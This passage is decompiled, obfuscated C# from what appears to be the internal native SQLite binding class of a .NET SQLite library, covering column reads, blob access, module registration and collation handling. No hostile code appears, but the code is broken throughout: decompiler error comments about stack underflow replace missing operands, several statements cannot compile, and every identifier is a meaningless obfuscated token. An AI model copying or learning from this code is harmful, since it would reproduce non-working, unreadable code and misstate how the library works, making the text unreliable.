			//IL_0070: Incompatible stack heights: 0 vs 1
			global::_0001._001F obj = ((global::_0013._0017)/*Error near IL_0007: Stack underflow*/)._0001;
			int num = global::_0011._0018._0001(global::_0001._001F._0001((global::_0001._001F)/*Error near IL_0010: Stack underflow*/), global::_0011._0018._0001(_0004));
			if ((_0003 & SQLiteConnectionFlags.LogBind) == SQLiteConnectionFlags.LogBind)
			{
				IntPtr intPtr = global::_0001._001F._0001(obj);
				global::_0011._0018._0001(global::_0011._0018._0001((IFormatProvider)_008F_0003._008C_0007(), _0080._0014._0001(107403529), new object[3] { intPtr, _0004, num }));
			}
			return num;
		}

		internal override int _0001(global::_0013._0017 _0002)
		{
			//IL_000d: Incompatible stack heights: 0 vs 1
			//IL_0014: Incompatible stack heights: 0 vs 1
			//IL_001b: Incompatible stack heights: 0 vs 1
			global::_0001._001F._0001(((global::_0013._0017)/*Error near IL_0007: Stack underflow*/)._0001);
			global::_0011._0018._0001((IntPtr)/*Error near IL_001b: Stack underflow*/);
			return (int)/*Error near IL_000c: Stack underflow*/;
		}

		internal override string _0001(global::_0013._0017 _0002, int _0003)
		{
			//IL_0040: Incompatible stack heights: 0 vs 1
			//IL_0047: Incompatible stack heights: 0 vs 1
			int num = 0;
			global::_0001._001F._0001(((global::_0013._0017)/*Error near IL_000a: Stack underflow*/)._0001);
			IntPtr intPtr = global::_0011._0018._0001((IntPtr)/*Error near IL_0014: Stack underflow*/, _0003, ref num);
			if (_0090_0002._009A_0005(intPtr, IntPtr.Zero))
			{
				throw new SQLiteException(_0080._0017._000E, ((global::_0011._0013)this)._0002());
			}
			return global::_0011._0018._0001(intPtr, num);
		}

		internal override global::_0014._0017 _0001(global::_0013._0017 _0002, int _0003)
		{
			//IL_0012: Incompatible stack heights: 0 vs 1
			//IL_0019: Incompatible stack heights: 0 vs 1
			//IL_001c: Incompatible stack heights: 0 vs 1
			global::_0001._001F._0001(((global::_0013._0017)/*Error near IL_0007: Stack underflow*/)._0001);
			return global::_0011._0018._0001((IntPtr)/*Error near IL_0010: Stack underflow*/, (int)/*Error near IL_0010: Stack underflow*/);
		}

		internal override string _0001(global::_0013._0017 _0002, int _0003, ref global::_0014._0017 _0004)
		{
			//IL_007c: Incompatible stack heights: 0 vs 1
			//IL_0086: Incompatible stack heights: 0 vs 1
			int num = 0;
			global::_0001._001F._0001(((global::_0013._0017)/*Error near IL_000d: Stack underflow*/)._0001);
			IntPtr intPtr = global::_0011._0018._0001((IntPtr)/*Error near IL_001a: Stack underflow*/, _0003, ref num);
			_0004 = ((global::_0011._0013)this)._0001(_0002, _0003);
			if (_0090_0002._0099_0005(intPtr, IntPtr.Zero) && (num > 0 || num == -1))
			{
				string text = global::_0011._0018._0001(intPtr, num);
				if (!global::_001C._0096_0003(text))
				{
					return text;
				}
			}
			string[] array = _0002._0002;
			if (array != null && _0003 < array.Length && array[_0003] != null)
			{
				return array[_0003];
			}
			return string.Empty;
		}

		internal override int _0001(global::_0013._0017 _0002, string _0003)
		{
			//IL_002e: Incompatible stack heights: 0 vs 1
			//IL_0031: Incompatible stack heights: 0 vs 1
			//IL_0038: Incompatible stack heights: 0 vs 1
			((global::_0011._0013)/*Error near IL_0038: Stack underflow*/)._0001((global::_0013._0017)/*Error near IL_0038: Stack underflow*/);
			int num = (int)/*Error near IL_0007: Stack underflow*/;
			for (int i = 0; i < num; i++)
			{
				if (_009D_0003._009D_0007(_0003, ((global::_0011._0013)this)._0001(_0002, i), StringComparison.OrdinalIgnoreCase) == 0)
				{
					return i;
				}
			}
			return -1;
		}

		internal override string _0002(global::_0013._0017 _0002, int _0003)
		{
			//IL_001f: Incompatible stack heights: 0 vs 1
			//IL_0026: Incompatible stack heights: 0 vs 1
			int num = 0;
			global::_0001._001F._0001(((global::_0013._0017)/*Error near IL_000a: Stack underflow*/)._0001);
			return global::_0011._0018._0001(global::_0011._0018._0001((IntPtr)/*Error near IL_0014: Stack underflow*/, _0003, ref num), num);
		}

		internal override string _0003(global::_0013._0017 _0002, int _0003)
		{
			//IL_001f: Incompatible stack heights: 0 vs 1
			//IL_0026: Incompatible stack heights: 0 vs 1
			int num = 0;
			global::_0001._001F._0001(((global::_0013._0017)/*Error near IL_000a: Stack underflow*/)._0001);
			return global::_0011._0018._0001(global::_0011._0018._0001((IntPtr)/*Error near IL_0014: Stack underflow*/, _0003, ref num), num);
		}

		internal override string _0004(global::_0013._0017 _0002, int _0003)
		{
			//IL_001f: Incompatible stack heights: 0 vs 1
			//IL_0026: Incompatible stack heights: 0 vs 1
			int num = 0;
			global::_0001._001F._0001(((global::_0013._0017)/*Error near IL_000a: Stack underflow*/)._0001);
			return global::_0011._0018._0001(global::_0011._0018._0001((IntPtr)/*Error near IL_0014: Stack underflow*/, _0003, ref num), num);
		}

		internal override void _0001(string _0002, string _0003, string _0004, ref string _0005, ref string _0006, ref bool _0007, ref bool _0008, ref bool _000E)
		{
			IntPtr zero = IntPtr.Zero;
			IntPtr zero2 = IntPtr.Zero;
			int num = 0;
			int num2 = 0;
			int num3 = 0;
			int num4 = 0;
			int num5 = 0;
			_0080._0017 obj = global::_0011._0018._0001(global::_000E._001F._0001(this._0001), global::_0011._0018._0001(_0002), global::_0011._0018._0001(_0003), global::_0011._0018._0001(_0004), ref zero, ref zero2, ref num, ref num2, ref num3, ref num4, ref num5);
			if (obj != 0)
			{
				throw new SQLiteException(obj, ((global::_0011._0013)this)._0002());
			}
			_0005 = global::_0011._0018._0001(zero, num4);
			_0006 = global::_0011._0018._0001(zero2, num5);
			_0007 = num == 1;
			_0008 = num2 == 1;
			_000E = num3 == 1;
		}

		internal override object _0001(global::_0013._0017 _0002, int _0003)
		{
			//IL_0098: Incompatible stack heights: 0 vs 1
			//IL_009e: Incompatible stack heights: 0 vs 1
			//IL_00a4: Incompatible stack heights: 0 vs 1
			switch (((global::_0011._0013)/*Error near IL_0014: Stack underflow*/)._0001((global::_0013._0017)/*Error near IL_0014: Stack underflow*/, (int)/*Error near IL_0014: Stack underflow*/))
			{
			case global::_0014._0017._0002:
				return ((global::_0011._0013)this)._0001(_0002, _0003);
			case global::_0014._0017._0003:
				return ((global::_0011._0013)this)._0001(_0002, _0003);
			case global::_0014._0017._0004:
				return _0005(_0002, _0003);
			case global::_0014._0017._0005:
			{
				long num = _0001(_0002, _0003, 0, (byte[])null, 0, 0);
				if (num > 0 && num <= int.MaxValue)
				{
					byte[] array = new byte[(int)num];
					_0001(_0002, _0003, 0, array, 0, (int)num);
					return array;
				}
				break;
			}
			case global::_0014._0017._0006:
				return DBNull.Value;
			}
			throw new NotImplementedException();
		}

		internal override double _0001(global::_0013._0017 _0002, int _0003)
		{
			//IL_0012: Incompatible stack heights: 0 vs 1
			//IL_0019: Incompatible stack heights: 0 vs 1
			//IL_001c: Incompatible stack heights: 0 vs 1
			global::_0001._001F._0001(((global::_0013._0017)/*Error near IL_0007: Stack underflow*/)._0001);
			return global::_0011._0018._0001((IntPtr)/*Error near IL_0010: Stack underflow*/, (int)/*Error near IL_0010: Stack underflow*/);
		}

		internal override bool _0001(global::_0013._0017 _0002, int _0003)
		{
			//IL_0021: Incompatible stack heights: 0 vs 1
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_0027: Incompatible stack heights: 0 vs 1
			object obj = ((global::_0011._0013)/*Error near IL_000b: Stack underflow*/)._0001((global::_0013._0017)/*Error near IL_000b: Stack underflow*/, (int)/*Error near IL_000b: Stack underflow*/);
			IFormatProvider formatProvider = _008F_0003._008B_0007();
			return global::_0011._0018._0001(_0002: false, formatProvider, obj);
		}

		internal override sbyte _0001(global::_0013._0017 _0002, int _0003)
		{
			//IL_0014: Incompatible stack heights: 0 vs 1
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 1
			return (sbyte)(((global::_0011._0013)/*Error near IL_000b: Stack underflow*/)._0001((global::_0013._0017)/*Error near IL_000b: Stack underflow*/, (int)/*Error near IL_000b: Stack underflow*/) & 0xFF);
		}

		internal override byte _0001(global::_0013._0017 _0002, int _0003)
		{
			//IL_0014: Incompatible stack heights: 0 vs 1
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 1
			return (byte)((uint)((global::_0011._0013)/*Error near IL_000b: Stack underflow*/)._0001((global::_0013._0017)/*Error near IL_000b: Stack underflow*/, (int)/*Error near IL_000b: Stack underflow*/) & 0xFFu);
		}

		internal override short _0001(global::_0013._0017 _0002, int _0003)
		{
			//IL_0014: Incompatible stack heights: 0 vs 1
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 1
			return (short)(((global::_0011._0013)/*Error near IL_000b: Stack underflow*/)._0001((global::_0013._0017)/*Error near IL_000b: Stack underflow*/, (int)/*Error near IL_000b: Stack underflow*/) & 0xFFFF);
		}

		internal override ushort _0001(global::_0013._0017 _0002, int _0003)
		{
			//IL_0014: Incompatible stack heights: 0 vs 1
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 1
			return (ushort)((uint)((global::_0011._0013)/*Error near IL_000b: Stack underflow*/)._0001((global::_0013._0017)/*Error near IL_000b: Stack underflow*/, (int)/*Error near IL_000b: Stack underflow*/) & 0xFFFFu);
		}

		internal override int _0001(global::_0013._0017 _0002, int _0003)
		{
			//IL_0012: Incompatible stack heights: 0 vs 1
			//IL_0019: Incompatible stack heights: 0 vs 1
			//IL_001c: Incompatible stack heights: 0 vs 1
			global::_0001._001F._0001(((global::_0013._0017)/*Error near IL_0007: Stack underflow*/)._0001);
			return global::_0011._0018._0001((IntPtr)/*Error near IL_0010: Stack underflow*/, (int)/*Error near IL_0010: Stack underflow*/);
		}

		internal override uint _0001(global::_0013._0017 _0002, int _0003)
		{
			//IL_000d: Incompatible stack heights: 0 vs 1
			//IL_0010: Incompatible stack heights: 0 vs 1
			//IL_0013: Incompatible stack heights: 0 vs 1
			return (uint)((global::_0011._0013)/*Error near IL_000b: Stack underflow*/)._0001((global::_0013._0017)/*Error near IL_000b: Stack underflow*/, (int)/*Error near IL_000b: Stack underflow*/);
		}

		internal override long _0001(global::_0013._0017 _0002, int _0003)
		{
			//IL_0012: Incompatible stack heights: 0 vs 1
			//IL_0019: Incompatible stack heights: 0 vs 1
			//IL_001c: Incompatible stack heights: 0 vs 1
			global::_0001._001F._0001(((global::_0013._0017)/*Error near IL_0007: Stack underflow*/)._0001);
			return global::_0011._0018._0001((IntPtr)/*Error near IL_0010: Stack underflow*/, (int)/*Error near IL_0010: Stack underflow*/);
		}

		internal override ulong _0001(global::_0013._0017 _0002, int _0003)
		{
			//IL_000d: Incompatible stack heights: 0 vs 1
			//IL_0010: Incompatible stack heights: 0 vs 1
			//IL_0013: Incompatible stack heights: 0 vs 1
			return (ulong)((global::_0011._0013)/*Error near IL_000b: Stack underflow*/)._0001((global::_0013._0017)/*Error near IL_000b: Stack underflow*/, (int)/*Error near IL_000b: Stack underflow*/);
		}

		internal override string _0005(global::_0013._0017 _0002, int _0003)
		{
			//IL_001f: Incompatible stack heights: 0 vs 1
			//IL_0026: Incompatible stack heights: 0 vs 1
			int num = 0;
			global::_0001._001F._0001(((global::_0013._0017)/*Error near IL_000a: Stack underflow*/)._0001);
			return global::_0011._0018._0001(global::_0011._0018._0001((IntPtr)/*Error near IL_0014: Stack underflow*/, _0003, ref num), num);
		}

		internal override DateTime _0001(global::_0013._0017 _0002, int _0003)
		{
			//IL_0077: Incompatible stack heights: 0 vs 1
			//IL_007d: Incompatible stack heights: 0 vs 1
			//IL_0080: Incompatible stack heights: 0 vs 1
			if (((global::_0001._001A)/*Error near IL_0007: Stack underflow*/)._0001 == SQLiteDateFormats.Ticks)
			{
				return new DateTime(((global::_0011._0013)/*Error near IL_0013: Stack underflow*/)._0001((global::_0013._0017)/*Error near IL_0013: Stack underflow*/, _0003), ((global::_0001._001A)this)._0001);
			}
			if (((global::_0001._001A)this)._0001 == SQLiteDateFormats.JulianDay)
			{
				return global::_0011._0018._0001(((global::_0011._0013)this)._0001(_0002, _0003), ((global::_0001._001A)this)._0001);
			}
			if (((global::_0001._001A)this)._0001 == SQLiteDateFormats.UnixEpoch)
			{
				return global::_0011._0018._0001(((global::_0011._0013)this)._0001(_0002, _0003), ((global::_0001._001A)this)._0001);
			}
			int num = 0;
			return global::_0011._0018._0001(num, (global::_0001._001A)this, global::_0011._0018._0001(global::_0001._001F._0001(_0002._0001), _0003, ref num));
		}

		internal override long _0001(global::_0013._0017 _0002, int _0003, int _0004, byte[] _0005, int _0006, int _0007)
		{
			//IL_007e: Incompatible stack heights: 0 vs 1
			//IL_0088: Incompatible stack heights: 0 vs 1
			//IL_008e: Incompatible stack heights: 0 vs 1
			global::_0001._001F._0001(((global::_0013._0017)/*Error near IL_0007: Stack underflow*/)._0001);
			int num = global::_0011._0018._0001((IntPtr)/*Error near IL_0016: Stack underflow*/, (int)/*Error near IL_0016: Stack underflow*/);
			if (_0005 == null)
			{
				return num;
			}
			int num2 = _0007;
			if (num2 + _0006 > _0005.Length)
			{
				num2 = _0005.Length - _0006;
			}
			if (num2 + _0004 > num)
			{
				num2 = num - _0004;
			}
			if (num2 > 0)
			{
				IntPtr intPtr = global::_0011._0018._0001(global::_0001._001F._0001(_0002._0001), _0003);
				_0011_0003._008D_0006(_009C._0092_0004(intPtr.ToInt64() + _0004), _0005, _0006, num2);
			}
			else
			{
				num2 = 0;
			}
			return num2;
		}

		internal override char _0001(global::_0013._0017 _0002, int _0003)
		{
			//IL_0017: Incompatible stack heights: 0 vs 2
			//IL_001a: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 1
			_ = _0002_0004._0007_0008;
			ushort num = ((global::_0011._0013)/*Error near IL_0010: Stack underflow*/)._0001((global::_0013._0017)/*Error near IL_0010: Stack underflow*/, (int)/*Error near IL_0010: Stack underflow*/);
			return /*Error near IL_0015: Stack underflow*/(num);
		}

		internal override long _0001(global::_0013._0017 _0002, int _0003, int _0004, char[] _0005, int _0006, int _0007)
		{
			//IL_005b: Incompatible stack heights: 0 vs 1
			//IL_0061: Incompatible stack heights: 0 vs 1
			int num = (int)/*Error near IL_005e: Stack underflow*/;
			string text = ((global::_0011._0013)/*Error near IL_000d: Stack underflow*/)._0005(_0002, _0003);
			int num2 = global::_001A._007E_0016_0003(text);
			if (_0005 == null)
			{
				return num2;
			}
			if (num + _0006 > _0005.Length)
			{
				num = _0005.Length - _0006;
			}
			if (num + _0004 > num2)
			{
				num = num2 - _0004;
			}
			if (num > 0)
			{
				_0003_0004._007E_0008_0008(text, _0004, _0005, _0006, num);
			}
			else
			{
				num = 0;
			}
			return num;
		}

		internal override bool _0002(global::_0013._0017 _0002, int _0003)
		{
			//IL_0010: Incompatible stack heights: 0 vs 1
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_0016: Incompatible stack heights: 0 vs 1
			return ((global::_0011._0013)/*Error near IL_000b: Stack underflow*/)._0001((global::_0013._0017)/*Error near IL_000b: Stack underflow*/, (int)/*Error near IL_000b: Stack underflow*/) == global::_0014._0017._0006;
		}

		internal override int _0001(IntPtr _0002)
		{
			//IL_0006: Incompatible stack heights: 0 vs 1
			//IL_000d: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((IntPtr)/*Error near IL_000d: Stack underflow*/);
			return (int)/*Error near IL_0005: Stack underflow*/;
		}

		internal override _0080._0017 _0001(string _0002, int _0003, bool _0004, global::_0019._001F _0005, global::_0019._001F _0006, _001C _0007, bool _0008)
		{
			//IL_0075: Incompatible stack heights: 0 vs 1
			//IL_007f: Incompatible stack heights: 0 vs 1
			//IL_0085: Incompatible stack heights: 0 vs 1
			global::_000E._001F._0001(((_0019)/*Error near IL_0007: Stack underflow*/)._0001);
			_0080._0017 obj2 = global::_0011._0018._0001(_0003: global::_0011._0018._0001((string)/*Error near IL_0016: Stack underflow*/), _0004: _0003, _0005: 4, _0006: IntPtr.Zero, _0002: (IntPtr)/*Error near IL_002f: Stack underflow*/, _0007: _0005, _0008: _0006, _000E: _0007, _000F: _0004 ? 1 : 0);
			if (obj2 == _0080._0017._0002)
			{
				obj2 = global::_0011._0018._0001(global::_000E._001F._0001(this._0001), global::_0011._0018._0001(_0002), _0003, 1, IntPtr.Zero, _0005, _0006, _0007, _0004 ? 1 : 0);
			}
			if (_0008 && obj2 != 0)
			{
				throw new SQLiteException(obj2, ((global::_0011._0013)this)._0002());
			}
			return obj2;
		}

		internal override _0080._0017 _0001(string _0002, global::_0006._001A _0003, global::_0006._001A _0004, bool _0005)
		{
			//IL_0055: Incompatible stack heights: 0 vs 1
			//IL_005c: Incompatible stack heights: 0 vs 1
			//IL_005f: Incompatible stack heights: 0 vs 1
			global::_000E._001F._0001(((_0019)/*Error near IL_0007: Stack underflow*/)._0001);
			_0080._0017 obj2 = global::_0011._0018._0001(_0003: global::_0011._0018._0001((string)/*Error near IL_0010: Stack underflow*/), _0004: 2, _0005: IntPtr.Zero, _0002: (IntPtr)/*Error near IL_001c: Stack underflow*/, _0006: _0004);
			if (obj2 == _0080._0017._0002)
			{
				obj2 = global::_0011._0018._0001(global::_000E._001F._0001(this._0001), global::_0011._0018._0001(_0002), 1, IntPtr.Zero, _0003);
			}
			if (_0005 && obj2 != 0)
			{
				throw new SQLiteException(obj2, ((global::_0011._0013)this)._0002());
			}
			return obj2;
		}

		internal override int _0001(global::_001E._0015 _0002, IntPtr _0003, string _0004, string _0005)
		{
			//IL_0070: Incompatible stack heights: 0 vs 1
			Encoding encoding = null;
			switch (/*Error near IL_0007: Stack underflow*/)
			{
			case 1L:
				encoding = _0082_0002._0088_0005();
				break;
			case 2L:
				encoding = _0082_0002._0089_0005();
				break;
			case 3L:
				encoding = _0082_0002._008A_0005();
				break;
			}
			byte[] array = _0087_0003._007E_0081_0007(encoding, _0004);
			byte[] array2 = _0087_0003._007E_0081_0007(encoding, _0005);
			return global::_0011._0018._0001(_0003, array, array.Length, array2, array2.Length);
		}

		internal override int _0001(global::_001E._0015 _0002, IntPtr _0003, char[] _0004, char[] _0005)
		{
			//IL_0070: Incompatible stack heights: 0 vs 1
			Encoding encoding = null;
			switch (/*Error near IL_0007: Stack underflow*/)
			{
			case 1L:
				encoding = _0082_0002._0088_0005();
				break;
			case 2L:
				encoding = _0082_0002._0089_0005();
				break;
			case 3L:
				encoding = _0082_0002._008A_0005();
				break;
			}
			byte[] array = _0004_0004._007E_000E_0008(encoding, _0004);
			byte[] array2 = _0004_0004._007E_000E_0008(encoding, _0005);
			return global::_0011._0018._0001(_0003, array, array.Length, array2, array2.Length);
		}

		internal override global::_0011._0015 _0001(global::_0012._0014 _0002, IntPtr _0003)
		{
			global::_0011._0015 result = default(global::_0011._0015);
			int num = 0;
			int num2 = 0;
			int num3 = 0;
			IntPtr intPtr = global::_0011._0018._0001(_0003, ref num2, ref num3, ref num);
			result._0001 = global::_0011._0018._0001(intPtr, num);
			result._0001 = (global::_0001._001E)num2;
			result._0001 = _0002;
			result._0001 = (global::_001E._0015)num3;
			return result;
		}

		internal override long _0001(IntPtr _0002, int _0003, byte[] _0004, int _0005, int _0006)
		{
			//IL_005e: Incompatible stack heights: 0 vs 1
			//IL_0065: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((IntPtr)/*Error near IL_0065: Stack underflow*/);
			int num = (int)/*Error near IL_0068: Stack underflow*/;
			if (_0004 == null)
			{
				return num;
			}
			int num2 = _0006;
			if (num2 + _0005 > _0004.Length)
			{
				num2 = _0004.Length - _0005;
			}
			if (num2 + _0003 > num)
			{
				num2 = num - _0003;
			}
			if (num2 > 0)
			{
				IntPtr intPtr = global::_0011._0018._0001(_0002);
				_0011_0003._008D_0006(_009C._0092_0004(intPtr.ToInt64() + _0003), _0004, _0005, num2);
			}
			else
			{
				num2 = 0;
			}
			return num2;
		}

		internal override double _0001(IntPtr _0002)
		{
			//IL_0006: Incompatible stack heights: 0 vs 1
			//IL_000d: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((IntPtr)/*Error near IL_000d: Stack underflow*/);
			return (double)/*Error near IL_0005: Stack underflow*/;
		}

		internal override int _0002(IntPtr _0002)
		{
			//IL_0006: Incompatible stack heights: 0 vs 1
			//IL_000d: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((IntPtr)/*Error near IL_000d: Stack underflow*/);
			return (int)/*Error near IL_0005: Stack underflow*/;
		}

		internal override long _0001(IntPtr _0002)
		{
			//IL_0006: Incompatible stack heights: 0 vs 1
			//IL_000d: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((IntPtr)/*Error near IL_000d: Stack underflow*/);
			return (long)/*Error near IL_0005: Stack underflow*/;
		}

		internal override string _0001(IntPtr _0002)
		{
			//IL_0014: Incompatible stack heights: 0 vs 1
			//IL_001b: Incompatible stack heights: 0 vs 1
			int num = 0;
			global::_0011._0018._0001((IntPtr)/*Error near IL_001b: Stack underflow*/, ref num);
			return global::_0011._0018._0001(_0003: num, _0002: (IntPtr)/*Error near IL_000f: Stack underflow*/);
		}

		internal override global::_0014._0017 _0001(IntPtr _0002)
		{
			//IL_0006: Incompatible stack heights: 0 vs 1
			//IL_000d: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((IntPtr)/*Error near IL_000d: Stack underflow*/);
			return (global::_0014._0017)/*Error near IL_0005: Stack underflow*/;
		}

		internal override void _0001(IntPtr _0002, byte[] _0003)
		{
			//IL_001a: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 1
			//IL_0020: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001(_0004: ((Array)/*Error near IL_0007: Stack underflow*/).Length, _0005: _0099._008E_0004(-1), _0002: (IntPtr)/*Error near IL_0018: Stack underflow*/, _0003: (byte[])/*Error near IL_0018: Stack underflow*/);
		}

		internal override void _0001(IntPtr _0002, double _0003)
		{
			//IL_0008: Incompatible stack heights: 0 vs 1
			//IL_000b: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((IntPtr)/*Error near IL_0012: Stack underflow*/, (double)/*Error near IL_0012: Stack underflow*/);
		}

		internal override void _0001(IntPtr _0002, string _0003)
		{
			//IL_0018: Incompatible stack heights: 0 vs 1
			//IL_001b: Incompatible stack heights: 0 vs 1
			//IL_0022: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((string)/*Error near IL_0022: Stack underflow*/);
			global::_0011._0018._0001(_0004: global::_001A._007E_0016_0003(_0003), _0002: (IntPtr)/*Error near IL_0016: Stack underflow*/, _0003: (byte[])/*Error near IL_0016: Stack underflow*/);
		}

		internal override void _0001(IntPtr _0002, int _0003)
		{
			//IL_0008: Incompatible stack heights: 0 vs 1
			//IL_000b: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((IntPtr)/*Error near IL_0012: Stack underflow*/, (int)/*Error near IL_0012: Stack underflow*/);
		}

		internal override void _0001(IntPtr _0002, long _0003)
		{
			//IL_0008: Incompatible stack heights: 0 vs 1
			//IL_000b: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((IntPtr)/*Error near IL_0012: Stack underflow*/, (long)/*Error near IL_0012: Stack underflow*/);
		}

		internal override void _0001(IntPtr _0002)
		{
			//IL_0006: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((IntPtr)/*Error near IL_000d: Stack underflow*/);
		}

		internal override void _0002(IntPtr _0002, string _0003)
		{
			//IL_0026: Incompatible stack heights: 0 vs 1
			//IL_002d: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((string)/*Error near IL_002d: Stack underflow*/);
			byte[] array = default(byte[]);
			if (0 == 0)
			{
				array = (byte[])/*Error near IL_0030: Stack underflow*/;
			}
			global::_0011._0018._0001(_0002, global::_0011._0018._0001(_0003), array.Length - 1, _0099._008E_0004(-1));
		}

		internal override void _0001(global::_0001._0082 _0002, SQLiteConnectionFlags _0003)
		{
			//IL_010e: Incompatible stack heights: 0 vs 1
			//IL_0118: Incompatible stack heights: 0 vs 1
			//IL_0122: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0007: Stack underflow*/ == 0)
			{
				_0080._0014._0001(107402944);
				new ArgumentNullException((string?)/*Error near IL_0122: Stack underflow*/);
				throw /*Error near IL_0017: Stack underflow*/;
			}
			if ((_0003 & SQLiteConnectionFlags.NoLogModule) != SQLiteConnectionFlags.NoLogModule)
			{
				_0002.LogErrors = (_0003 & SQLiteConnectionFlags.LogModuleError) == SQLiteConnectionFlags.LogModuleError;
				_0002.LogExceptions = (_0003 & SQLiteConnectionFlags.LogModuleException) == SQLiteConnectionFlags.LogModuleException;
			}
			if (this._0001 == null)
			{
				throw new SQLiteException(_0080._0014._0001(107402967));
			}
			bool flag = false;
			string text = global::_0011._0018._0001(this, ref flag);
			if (flag)
			{
				if (text == null)
				{
					throw new SQLiteException(_0080._0014._0001(107402890));
				}
				if (this._0005 == null)
				{
					throw new SQLiteException(_0080._0014._0001(107402821));
				}
				this._0003(_0002: true);
				_0001(text, this._0005);
			}
			if (global::_0011._0018._0001(_0002, global::_000E._001F._0001(this._0001)))
			{
				if (this._0001 == null)
				{
					this._0001 = new Dictionary<string, global::_0001._0082>();
				}
				this._0001.Add(_0002.Name, _0002);
				if (this._0001)
				{
					this._0001 = false;
				}
				return;
			}
			throw new SQLiteException(((global::_0011._0013)this)._0002());
		}

		internal override void _0002(global::_0001._0082 _0002, SQLiteConnectionFlags _0003)
		{
			//IL_0016: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 1
			//IL_0024: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ == 0)
			{
				_0080._0014._0001(107402944);
				new ArgumentNullException((string?)/*Error near IL_0024: Stack underflow*/);
				throw /*Error near IL_000e: Stack underflow*/;
			}
			_0002._0001();
		}

		internal override IntPtr _0001(IntPtr _0002)
		{
			//IL_0007: Incompatible stack heights: 0 vs 1
			//IL_000e: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((IntPtr)/*Error near IL_000e: Stack underflow*/, 1);
			return (IntPtr)/*Error near IL_0006: Stack underflow*/;
		}

		internal unsafe override _0080._0017 _0001(global::_0001._0082 _0002, string _0003, ref string _0004)
		{
			//IL_0072: Incompatible stack heights: 0 vs 1
			//IL_0078: Incompatible stack heights: 0 vs 1
			//IL_0082: Incompatible stack heights: 0 vs 1
			if (((_0019)/*Error near IL_0007: Stack underflow*/)._0001 == null)
			{
				_0080._0014._0001(107402967);
				*(_003F*)(nint)/*Error near IL_0013: Stack underflow*/ = /*Error near IL_0013: Stack underflow*/;
				return _0080._0017._0003;
			}
			IntPtr intPtr = IntPtr.Zero;
			try
			{
				intPtr = global::_0011._0018._0001(_0003);
				_0080._0017 obj = global::_0011._0018._0001(global::_000E._001F._0001(this._0001), intPtr);
				if (obj == _0080._0017._0002 && _0002 != null)
				{
					_0002.Declared = true;
				}
				if (obj != 0)
				{
					_0004 = ((global::_0011._0013)this)._0002();
				}
				return obj;
			}
			finally
			{
				if (_0090_0002._0099_0005(intPtr, IntPtr.Zero))
				{
					global::_0011._0018._0001(intPtr);
					intPtr = IntPtr.Zero;
				}
			}
		}

		internal unsafe override _0080._0017 _0001(global::_0001._0082 _0002, int _0003, string _0004, ref string _0005)
		{
			//IL_0067: Incompatible stack heights: 0 vs 1
			//IL_006b: Incompatible stack heights: 0 vs 1
			//IL_0072: Incompatible stack heights: 0 vs 1
			if (((_0019)/*Error near IL_0007: Stack underflow*/)._0001 == null)
			{
				_0080._0014._0001(107402967);
				*(_003F*)(nint)/*Error near IL_0013: Stack underflow*/ = /*Error near IL_0013: Stack underflow*/;
				return _0080._0017._0003;
			}
			IntPtr intPtr = IntPtr.Zero;
			try
			{
				intPtr = global::_0011._0018._0001(_0004);
				_0080._0017 obj = global::_0011._0018._0001(global::_000E._001F._0001(this._0001), intPtr, _0003);
				if (obj != 0)
				{
					_0005 = ((global::_0011._0013)this)._0002();
				}
				return obj;
			}
			finally
			{
				if (_0090_0002._0099_0005(intPtr, IntPtr.Zero))
				{
					global::_0011._0018._0001(intPtr);
					intPtr = IntPtr.Zero;
				}
			}
		}

		internal override _0080._0017 _0001(global::_0003._0013 _0002, bool _0003)
		{
			//IL_000a: Invalid comparison between Unknown and I4
			//IL_0016: Invalid comparison between Unknown and I4
			//IL_008e: Incompatible stack heights: 0 vs 1
			//IL_0094: Incompatible stack heights: 0 vs 1
			//IL_009e: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_000c: Stack underflow*/ < 1002 || (int)/*Error near IL_0018: Stack underflow*/ > 1005)
			{
				_008F_0003._008C_0007();
				throw new SQLiteException(global::_0011._0018._0001(_0003: _0080._0014._0001(107402780), _0004: new object[4]
				{
					global::_0003._0013._0003,
					global::_0003._0013._0004,
					global::_0003._0013._0005,
					global::_0003._0013._0006
				}, _0002: (IFormatProvider)/*Error near IL_006a: Stack underflow*/));
			}
			int num = 0;
			return global::_0011._0018._0001(global::_000E._001F._0001(this._0001), _0002, _0003 ? 1 : 0, ref num);
		}

		internal override void _0003(bool _0002)
		{
			//IL_0007: Invalid comparison between Unknown and I4
			//IL_0048: Incompatible stack heights: 0 vs 1
			//IL_004b: Incompatible stack heights: 0 vs 1
			//IL_004e: Incompatible stack heights: 0 vs 2
			_ = SQLiteVersionNumber;
			_0080._0017 obj;
			if ((int)/*Error near IL_0009: Stack underflow*/ >= 3013000)
			{
				_ = 1005;
				obj = ((global::_0011._0013)/*Error near IL_0017: Stack underflow*/)._0001((global::_0003._0013)/*Error near IL_0017: Stack underflow*/, (byte)/*Error near IL_0017: Stack underflow*/ != 0);
			}
			else
			{
